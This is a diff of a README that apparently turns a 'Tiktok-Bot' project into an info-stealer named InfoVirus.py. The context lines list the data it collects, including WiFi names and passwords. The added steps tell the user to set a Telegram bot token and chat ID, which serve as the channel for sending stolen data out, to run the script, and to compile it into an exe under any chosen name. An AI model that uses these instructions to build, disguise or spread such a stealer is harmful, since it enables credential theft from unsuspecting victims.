@@ -33,28 +33,41 @@
             PLUGGED IN
             WIFI NAME
             WIFI PASSWORD
+:
 
 ```
 
-## 🔐 ~ Password
-```ts
-Password = Froxxy1011
-```
+
   
 ## 🚀 ~ Setup
 
 ```ts
-1. Download the file (https://github.com/Froxxy1011/Tiktok-Bot.git or Download Zip)
+1. Download the file
 
-2. Navigate in to the directory (cd Tiktok-Bot)
+2. Navigate in to the directory
 
 3. Install the required modules with:
-   > pip install -r requirement.txt
+   > pip install -r requirements.txt
+
+4. Change the Bot_token and Chat id
+
 4. Run the application using:
-   > python launcher_gui.py
+   > python Infovirus.py
 
 5. Enjoy!
 ```
+
+## 🔐 ~ Making it an Exe
+```ts
+1. Navigate in to the directory
+
+2. Run Makeexe.exe
+
+3. Change the name of the file (InfoVirus.py) into anything you want your exe to be named. (You need to write it with the py extension & Optional)
+
+4. Your exe file will be ready in /dist
+```
+
 ## 🤖 ~ Special Cases
 ```ts
 
@@ -63,8 +76,8 @@ Password = Froxxy1011
 
 ## ⚙️ ~ Requirements
 ```ts
-> Requirement.txt
+> Requirements.txt
 > Python
-> Chrome (Latest Version!)
+> Telegram BotToken & ChatId
 ```
 
